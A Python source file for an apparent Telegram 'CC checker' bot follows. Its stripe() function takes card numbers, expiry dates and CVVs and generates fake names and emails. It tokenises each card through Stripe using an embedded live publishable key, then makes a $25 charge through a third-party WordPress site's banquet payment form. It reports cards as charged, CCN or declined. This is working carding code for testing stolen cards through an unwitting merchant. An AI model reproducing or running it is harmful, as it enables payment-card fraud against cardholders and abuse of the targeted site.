import random
import string
import requests
from database.db import *
from utils.bot_config import *
from handlers.command_handlers import *

def stripe(cc, mes, ano, cvv, message):
    letters = string.ascii_lowercase
    First = ''.join(random.choice(letters) for _ in range(6))
    Last = ''.join(random.choice(letters) for _ in range(6))
    PWD = ''.join(random.choice(letters) for _ in range(10))
    Name = f'{First}+{Last}'
    Email = f'{First}.{Last}@gmail.com'
    session = requests.Session()
    mm = mes
    yy = ano

    sent_message = bot.send_message(message.chat.id, "Comenzando...")
    for i in range(10):
            bot.edit_message_text(chat_id=message.chat.id, text = f'''
                                  • VERIFICANDO CC: •{i * 10}%''',
                                  reply_markup=None,
                                  message_id=sent_message.message_id,
                                  parse_mode="HTML"
                                 )
            time.sleep(1)
    
    bot.send_chat_action(message.chat.id, 'typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    
    # get guid muid sid
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded"
    }
    s = session.post('https://m.stripe.com/6', headers=headers)
    r = s.json()
    Guid = r['guid']
    Muid = r['muid']
    Sid = r['sid']

    postdata = {
        "guid": Guid,
        "muid": Muid,
        "sid": Sid,
        "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
        "card[name]": Name,
        "card[number]": cc,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "card[cvc]": cvv
    }

    HEADER = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "accept-language": "en-US,en;q=0.9"
    }

    pr = session.post('https://api.stripe.com/v1/tokens', data=postdata, headers=HEADER)
    Id = pr.json()['id']

    # hmm
    load = {
        "action": "wp_full_stripe_payment_charge",
        "formName": "BanquetPayment",
        "fullstripe_name": Name,
        "fullstripe_email": Email,
        "fullstripe_custom_amount": "25.0",
        "fullstripe_amount_index": 0,
        "stripeToken": Id
    }

    header = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "origin": "https://archiro.org",
        "referer": "https://archiro.org/banquet/",
        "accept-language": "en-US,en;q=0.9"
    }

    rx = session.post('https://archiro.org/wp-admin/admin-ajax.php', data=load, headers=header)
    msg = rx.json()['msg']

    if 'true' in rx.text:
        return bot.reply_to(message, f'''
✅<b>CC</b>➟ <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CHARGED 25$
<b>MSG</b>➟ {msg}
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {'✅' if is_owner(ID) else '🚫'}
<b>BOT</b>: @{BOT_USERNAME}''',
                            parse_mode="HTML"
                           )

    if 'security code' in rx.text:
        return bot.reply_to(message, f'''
✅<b>CC</b>➟ <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CCN
<b>MSG</b>➟ {msg}
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {'✅' if is_owner(ID) else '🚫'}
<b>BOT</b>: @{BOT_USERNAME}''',
                            parse_mode="HTML"
                           )

    if 'false' in rx.text:
        return bot.reply_to(message, f'''
❌<b>CC</b>➟ <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #Declined
<b>MSG</b>➟ {msg}
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {'✅' if is_owner(ID) else '🚫'}
<b>BOT</b>: @{BOT_USERNAME}''',
                            parse_mode="HTML"
                           )

    bot.reply_to(message, f'''
❌<b>CC</b>➟ <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {rx.text}
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {'✅' if is_owner(ID) else '🚫'}
<b>BOT</b>: @{BOT_USERNAME}''',
                 parse_mode="HTML"
                )
